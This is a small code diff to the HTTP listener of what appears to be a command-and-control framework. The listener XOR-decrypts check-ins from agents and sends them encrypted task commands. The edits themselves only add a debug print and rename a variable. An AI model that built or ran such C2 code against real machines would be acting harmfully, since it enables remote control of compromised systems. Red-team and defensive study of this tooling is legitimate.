@@ -52,13 +52,13 @@ class HttpListener(BaseListener):
             if request.headers.get(header) != value:
                 print("Invalid header")
                 return f"Invalid header {header}", 403
-
         # decoding data
         agent_id = None
         decoded_json = {}
         try:
             enc_data = request.get_data()
             decoded_result = self.xor_cipher.decrypt(enc_data)
+            print(decoded_result)
             parsed_json = json.loads(decoded_result)
             agent_id = parsed_json.get("agent_id")
             hostname = parsed_json.get("hostname")
@@ -93,9 +93,11 @@ class HttpListener(BaseListener):
                 print(f"[+] Sending task to {agent_id} : {cmd}")
                 clear_task = '{"task":"'+cmd+'"}'
                 encoded_task = self.xor_cipher.encrypt( clear_task.encode("utf-8", errors="replace") )
-                return jsonify(str(encoded_task))
+                jason = jsonify(str(encoded_task))
+                return jason
         except Exception as exc:
             print(f"[!] Error while handling agent data : {exc}")
+
             pass
         return jsonify("")
 
